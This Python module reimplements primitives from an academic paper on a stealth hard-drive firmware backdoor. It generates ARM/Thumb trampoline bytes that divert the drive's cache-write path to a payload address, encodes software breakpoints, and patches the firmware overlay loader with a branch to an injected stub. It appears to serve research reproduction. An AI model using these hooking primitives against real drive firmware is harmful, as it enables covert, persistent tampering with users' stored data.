"""Firmware write interception and debugger primitives from ACSAC'13 (§2.1-§2.2).

Sources:
  - Zaddach et al., "Implementation and Implications of a Stealth Hard-Drive
    Backdoor", ACSAC 2013, sections 2.1 and 2.2.
"""

from __future__ import annotations

import struct
from dataclasses import dataclass
from typing import ClassVar


@dataclass
class WriteHookPoint:
    """Write-path hook metadata for ARM966 firmware cache->RW interception."""

    cache_evict_fn_addr: int
    hook_trampoline_addr: int
    hook_payload_addr: int
    intercept_mode: str

    def trampoline_bytes(self, arch: str = "arm966") -> bytes:
        if arch != "arm966":
            raise ValueError("only arm966 is supported")
        if not self.is_valid():
            raise ValueError("invalid hook point")

        push_lr = b"\x00\xb5"
        ldr_r3_pc = b"\x01\x4b"
        blx_r3 = b"\x98\x47"
        pop_pc = b"\x00\xbd"
        literal = struct.pack("<I", self.hook_payload_addr)
        return push_lr + ldr_r3_pc + blx_r3 + pop_pc + literal

    def is_valid(self) -> bool:
        if self.intercept_mode not in {"pre_commit", "post_cache"}:
            return False
        addrs = [self.cache_evict_fn_addr, self.hook_trampoline_addr, self.hook_payload_addr]
        return all(addr != 0 and addr % 4 == 0 for addr in addrs)


class ArmSoftwareBreakpoint:
    """Software breakpoint encoding for ARM966 debugger stubs."""

    def __init__(self, target_addr: int, original_instruction: int):
        self.target_addr = target_addr
        self.original_instruction = original_instruction

    def encode_undef_instruction(self) -> bytes:
        return struct.pack("<I", 0xE7F001F0)

    def encode_thumb_bkpt(self) -> bytes:
        return struct.pack("<H", 0xBEBE)

    @staticmethod
    def is_thumb_addr(addr: int) -> bool:
        return bool(addr & 1)


class FirmwareOverlayLoader:
    """Overlay loader model for reinjecting debugger stubs after overlay swaps."""

    DIAGNOSTIC_OVERLAY_IDS: ClassVar[list[int]] = [4, 5]

    def __init__(self, overlay_table: dict[int, int]):
        self.overlay_table = overlay_table

    def get_overlay_load_addr(self, overlay_id: int) -> int | None:
        return self.overlay_table.get(overlay_id)

    def hook_overlay_loader(self, loader_fn_addr: int, stub_addr: int) -> bytes:
        if loader_fn_addr % 4 != 0 or stub_addr % 4 != 0:
            raise ValueError("addresses must be word aligned")
        branch_offset = (stub_addr - loader_fn_addr - 8) >> 2
        instruction = 0xEA000000 | (branch_offset & 0x00FFFFFF)
        return struct.pack("<I", instruction)
